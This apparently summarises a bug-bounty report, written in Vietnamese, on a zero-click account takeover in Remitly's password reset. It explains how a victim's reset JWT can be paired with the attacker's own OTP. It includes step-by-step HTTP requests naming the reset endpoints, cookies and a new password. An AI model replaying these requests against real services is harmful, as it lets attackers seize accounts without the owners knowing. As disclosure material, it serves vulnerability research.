**Tóm tắt lỗi:**

Đây là lỗi **0-Click Account Takeover** cực kỳ nghiêm trọng trong chức năng password reset của Remitly - cho phép attacker reset password của victim mà không cần bất kỳ interaction nào từ victim.

**Nguyên nhân:**  
JWT token từ endpoint `/orchestrator/v1/password_reset/start` có thể bị **reuse** giữa các user sessions, cho phép attacker dùng token của victim để reset password.

---

## **Chi tiết kỹ thuật:**

### **Luồng password reset bình thường:**
```
1. User request password reset → /password_reset/start
2. Server gửi OTP đến user email/phone
3. User nhập OTP → xác minh
4. Cho phép đặt password mới
```

### **Luồng bị khai thác:**
```
1. Attacker request reset cho VICTIM → lấy JWT của victim
2. Attacker request reset cho CHÍNH MÌNH → lấy OTP của mình
3. Attacker dùng JWT của victim + OTP của mình → reset password victim
4. Victim mất account mà không hay biết
```

---

## **Ví dụ Request/Response:**

### **Bước 1: Lấy JWT token của victim**
```http
POST /orchestrator/v1/password_reset/start HTTP/1.1
Content-Type: application/json

{
  "email": "victim@remitly.com"
}
```

**Response (chứa JWT của victim):**
```http
HTTP/1.1 200 OK
Set-Cookie: AMP_d0cf3ed24c=victim_device_data
Set-Cookie: JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJ2aWN0aW1faWQiLCJlbWFpbCI6InZpY3RpbUBnbWFpbC5jb20iLCJpYXQiOjE2MzIwMDAwMDB9.victim_jwt_signature
```

### **Bước 2: Attacker request reset cho chính mình**
```http
POST /orchestrator/v1/password_reset/start HTTP/1.1
Content-Type: application/json

{
  "email": "attacker@remitly.com"
}
```
→ Nhận OTP gửi đến email/phone của attacker

### **Bước 3: Attacker submit OTP với JWT của victim**
```http
POST /orchestrator/v1/password_reset/verify HTTP/1.1
Content-Type: application/json
Cookie: JWT=victim_jwt_token; AMP_d0cf3ed24c=victim_device_data

{
  "otp": "123456",  // OTP của attacker
  "new_password": "Hacked@123"
}
```

**Kết quả:** Password của victim bị đổi thành "Hacked@123" mà victim không nhận được OTP!

---
